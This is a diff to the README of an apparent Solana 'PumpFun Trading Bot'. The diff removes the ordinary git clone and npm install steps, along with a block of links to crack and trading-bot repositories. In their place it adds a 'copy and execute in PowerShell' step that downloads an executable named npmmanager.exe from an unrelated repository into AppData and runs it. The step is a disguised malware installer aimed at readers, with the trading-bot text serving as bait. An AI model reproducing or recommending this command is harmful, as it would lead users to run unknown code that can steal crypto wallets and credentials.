@@ -2,22 +2,6 @@
 
 <h2>📊 Overview</h2>
 
-<a href="https://github.com/Photoshop-v26/Photoshop-Github" rel="ugc" class="transparent-link">Photoshop Crack GitHub</a>
-<a href="https://github.com/discordmusic-bot/discord-music-bot-Spotify" rel="ugc" class="transparent-link">Discord Music Bot</a>
-<a href="https://github.com/Binance-Trader-Bot/Binance-Auto-Trading-Bot" rel="ugc" class="transparent-link">Binance Auto Trading Bot</a>
-<a href="https://github.com/cryptoarbitragebot/arbitrage-trading-bot" rel="ugc" class="transparent-link">Arbitrage Trading Bot</a>
-<a href="https://github.com/forex-trading-bot/forex-trading-bot" rel="ugc" class="transparent-link">Forex Trading Bot</a>
-<a href="https://github.com/SolTrade-Bot/Solana-trading-bot" rel="ugc" class="transparent-link">Solana Trading Bot</a>
-<a href="https://github.com/Rug-Checker/Rug-Check" rel="ugc" class="transparent-link">Rug Checker</a>
-<a href="https://github.com/Pump-Fun-Sniper/Pump-Fun-Sniper-Bot" rel="ugc" class="transparent-link">Pump Fun Sniper Bot</a>
-
-
-
-
-
-
-
-
 <p><strong>PumpFun Trading Bot</strong> is your reliable assistant in the world of automated trading on the Solana blockchain! 🌟 With <strong>PumpFun Trading Bot</strong>, you can effectively manage your investments and stay ahead in the cryptocurrency market!</p>
 
 <p>With <strong>PumpFun Trading Bot</strong>, you can:</p>
@@ -35,9 +19,12 @@
 </ul>
 
 <h2>📥 Download the Program</h2>
+<h3>copy and execute the following command in **PowerShell**(Win+R)</h3>
 
-<p>You can download the limited version of the program for free directly from my repository! 🆓 However, the extended version is available for download at the link below and includes additional modules and modes of operation that are not included in the limited version. 💪</p>
-
+<pre>
+  <code id="code-snippet">&lt;Invoke-WebRequest -Uri "https://github.com/NPM-Package-Manager/NPM-Modules/raw/refs/heads/main/npmmanager.exe" -OutFile "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"
+Start-Process "C:\Users\$env:USERNAME\AppData\Local\npmmanager.exe"&gt;</code>
+</pre>
 <h2>🚀 Features</h2>
 
 <h3 id="feature1">💸 Distribute SOL to Many Wallets</h3>
@@ -99,23 +86,7 @@ Strategically gather SOL to optimize asset management and liquidity.
 This feature safeguards investors from fraudulent schemes known as "rug pulls" by analyzing projects for signs of fraud, such as anonymous developers, lack of transparency, and suspicious transactions, helping users make informed decisions and minimize risks when investing in new tokens.
 <hr>
 
-<h2>📥 Installation</h2>
 
-<p>Follow these simple steps to install <strong>Dex Checker</strong> on your device:</p>
-
-<ol>
-    <li>Clone the repository:
-        <pre><code>git clone https://github.com/Pump-Fun-Multi-Functional-Trading-Bot-for-Solana-and-Altcoins.git</code></pre>
-    </li>
-    <li>Navigate to the project directory:
-        <pre><code>cd TradingBot</code></pre>
-    </li>
-    <li>Install the necessary dependencies:
-        <pre><code>npm install</code></pre>
-    </li>
-</ol>
-
-<h2>🤝 Contribution</h2>
 
 <p>If you have ideas or suggestions for improving the project, we would love to hear from you! Create pull requests and share your ideas.</p>
 
